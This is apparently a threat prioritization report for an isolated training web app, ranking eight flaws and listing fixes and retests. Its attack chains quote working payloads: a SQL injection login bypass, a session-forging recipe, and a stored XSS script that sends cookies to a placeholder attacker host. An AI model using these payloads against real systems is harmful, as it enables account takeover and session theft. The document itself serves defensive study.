# Threat Prioritization

## Overview

This document ranks the identified threats from `threat-model/stride-register.md` using a qualitative risk model based on exploitability, impact, affected functionality, privilege requirements, data exposure, and scope. Rankings align with the RabTech Academy dossier Section 4.1 priorities.

**No CVSS scores are calculated** — insufficient environmental metrics (attack vector scope, confidentiality/integrity/availability requirements) exist for this isolated training lab to produce meaningful CVSS vectors. Qualitative ratings are used instead.

---

## Prioritization Matrix

| Rank | Threat ID | Threat Name | Severity | Exploitability | Impact | Privilege Required | Data Exposure | Scope |
|------|-----------|-------------|----------|----------------|--------|-------------------|---------------|-------|
| 1 | T-005 | Broken Admin Authorization | **Critical** | Trivial (direct URL) | Full user DB + plaintext passwords | Authenticated (any role) | All users, passwords, emails | Vertical + Horizontal |
| 2 | T-001 | SQL Injection (Login) | **High** | Trivial (single payload) | Auth bypass, potential data exfil | None (pre-auth) | All user records | Authentication boundary |
| 3 | T-004 | Stored XSS (Comments) | **High** | Low (post comment) | Persistent session theft, all visitors | Authenticated (any) | All visitor sessions | Persistent, wide |
| 4 | T-002 | IDOR (Profile) | **High** | Trivial (change ID) | Other users' notes, emails | Authenticated (any) | Target user data | Horizontal |
| 5 | T-007 | Plaintext Passwords | **High** | Requires T-005 or DB access | Credential reuse, account takeover | Admin access or DB access | All passwords | Data at rest |
| 6 | T-008 | Static Session Secret | **High** | Requires source access | Session forgery, privilege escalation | Source code access | All sessions | Application-wide |
| 7 | T-003 | Reflected XSS (Search) | **Medium** | Medium (crafted link) | Session theft via link click | None (pre-auth) | Victim session | Per-victim |
| 8 | T-006 | Debug Mode Disclosure | **Medium** | Medium (trigger error) | Source code, stack traces, debugger | None (pre-auth) | Internal app details | Error pages |

---

## Detailed Ranking Rationale

### 1. T-005 — Broken Admin Authorization (Critical)

**Why Critical**:
- **Exploitability**: Trivial — direct navigation to `/admin` after any login
- **Impact**: Complete compromise of user database including plaintext passwords
- **Privilege Escalation**: Vertical (user → admin) + Horizontal (all users)
- **Data Exposure**: All credentials, emails, roles — enables full account takeover
- **Scope**: Affects every user in system; passwords likely reused elsewhere
- **Dossier Mapping**: Explicitly "Critical" in Section 4.1

**Attack Chain**: Login as alice → visit `/admin` → harvest all passwords → login as admin

---

### 2. T-001 — SQL Injection in Login (High)

**Why High**:
- **Exploitability**: Trivial — single payload `admin' -- ` in username field
- **Impact**: Authentication bypass as any user (including admin)
- **Privilege Required**: None (pre-authentication)
- **Data Exposure**: Potential UNION-based exfiltration of entire database
- **Scope**: Authentication boundary — front door to application
- **Dossier Mapping**: "High" in Section 4.1

**Attack Chain**: `username=admin'--&password=anything` → logged in as admin → `/admin` → all passwords

---

### 3. T-004 — Stored XSS in Comments (High)

**Why High**:
- **Exploitability**: Low — requires posting comment, then victim visits `/comments`
- **Impact**: Persistent — payload executes for **every** visitor including admin
- **Privilege Required**: Authenticated (any user can post)
- **Data Exposure**: All visitor sessions, cookies, potential credential harvesting
- **Scope**: Persistent, affects all current and future visitors
- **Dossier Mapping**: "High" in Section 4.1

**Attack Chain**: Post `<script>fetch('http://attacker/?c='+document.cookie)</script>` → wait for admin to view comments → steal admin session

---

### 4. T-002 — IDOR in Profile Access (High)

**Why High**:
- **Exploitability**: Trivial — change `/profile/1` to `/profile/2`, `/profile/3`
- **Impact**: Unauthorized access to other users' sensitive notes (VPN keys, test card numbers)
- **Privilege Required**: Authenticated (any role)
- **Data Exposure**: PII (emails), operational notes (VPN keys, fake card data)
- **Scope**: Horizontal — all user profiles accessible
- **Dossier Mapping**: "High" in Section 4.1

**Attack Chain**: Login as alice → visit `/profile/1` (admin) → see admin email → visit `/profile/3` (bob) → see fake card note

---

### 5. T-007 — Plaintext Password Storage (High)

**Why High**:
- **Exploitability**: Requires T-005 (admin access) or direct DB access
- **Impact**: Credential disclosure enables reuse attacks, compliance failure
- **Privilege Required**: Admin access (via T-005) or filesystem access
- **Data Exposure**: All user passwords in cleartext
- **Scope**: Data at rest — affects all users permanently until rotated
- **Dossier Mapping**: "High" in Section 4.1

**Note**: Ranked below T-005 because it requires T-005 or DB access to exploit. If T-005 fixed, this becomes Medium (defense in depth).

---

### 6. T-008 — Static Session Secret (High)

**Why High**:
- **Exploitability**: Requires source code access (public in this repo) + Flask session knowledge
- **Impact**: Offline session forgery — can craft valid admin session without credentials
- **Privilege Required**: Source code access (public repo) + cryptographic knowledge
- **Data Exposure**: All session data forgeable; CSRF tokens predictable
- **Scope**: Application-wide — every session vulnerable
- **Dossier Mapping**: "High" in Section 4.1

**Attack Chain**: Extract secret from source → use `itsdangerous` to sign `{"user_id":1,"username":"admin","role":"admin"}` → set cookie → full admin access without login

**Note**: Ranked below T-001/T-004/T-002 because it requires cryptographic implementation knowledge, not just web interaction.

---

### 7. T-003 — Reflected XSS in Search (Medium)

**Why Medium**:
- **Exploitability**: Medium — requires victim to click crafted link
- **Impact**: Session theft, but only for victims who click link
- **Privilege Required**: None (pre-auth)
- **Data Exposure**: Single victim's session per click
- **Scope**: Per-victim, non-persistent
- **Dossier Mapping**: "Medium" in Section 4.1

**Attack Chain**: Send `http://127.0.0.1:8080/search?q=<script>steal()</script>` to victim → victim clicks → session stolen

**Mitigating Factors**: Requires social engineering; no persistence; localhost only (no external delivery)

---

### 8. T-006 — Debug Mode Information Disclosure (Medium)

**Why Medium**:
- **Exploitability**: Medium — requires triggering unhandled exception (e.g., `/profile/abc`)
- **Impact**: Source code disclosure, stack traces, interactive debugger (if PIN known)
- **Privilege Required**: None (pre-auth)
- **Data Exposure**: Internal application logic, file paths, variable state
- **Scope**: Error pages only
- **Dossier Mapping**: "Medium" in Section 4.1

**Attack Chain**: Visit `/profile/abc` → ValueError → full traceback with source → identify other vulnerabilities

**Note**: Debugger PIN (`143-264-480` in console) enables RCE if accessed — but PIN changes per restart and is not externally accessible.

---

## Priority Summary

| Priority | Threats | Action |
|----------|---------|--------|
| **Critical** | T-005 | Fix immediately — enables all other high-impact attacks |
| **High** | T-001, T-004, T-002, T-007, T-008 | Fix before any production use; all enable significant compromise |
| **Medium** | T-003, T-006 | Fix in next iteration; lower exploitability or impact |

---

## Remediation Priority Order

1. **T-005**: Add role check to `/admin` (blocks admin access + password exposure)
2. **T-001**: Parameterize login query (blocks auth bypass)
3. **T-004**: Remove `\|safe` from comments, add CSP (blocks persistent XSS)
4. **T-002**: Add ownership check to profiles (blocks IDOR)
5. **T-007**: Hash passwords with bcrypt (defense in depth)
6. **T-008**: Randomize secret key from environment (defense in depth)
7. **T-003**: Remove `\|safe` from search, add CSP (blocks reflected XSS)
8. **T-006**: Disable debug mode (defense in depth)

---

## Retest Objectives

After remediation, each threat must be retested:

| Threat ID | Retest Objective | Expected Result |
|-----------|------------------|-----------------|
| T-005 | Login as alice, visit `/admin` | 403 Forbidden |
| T-001 | Submit `admin' -- ` as username | Login fails (no row returned) |
| T-004 | Post `<script>alert(1)</script>`, visit `/comments` | Script rendered as text, not executed |
| T-002 | Login as alice, visit `/profile/1` | 403 Forbidden |
| T-007 | Inspect database `users.password` column | Bcrypt hashes, not plaintext |
| T-008 | Restart app, verify secret changes | New secret each deploy (env var) |
| T-003 | Visit `/search?q=<script>alert(1)</script>` | Script rendered as text |
| T-006 | Visit `/profile/abc` | Generic error page, no stack trace |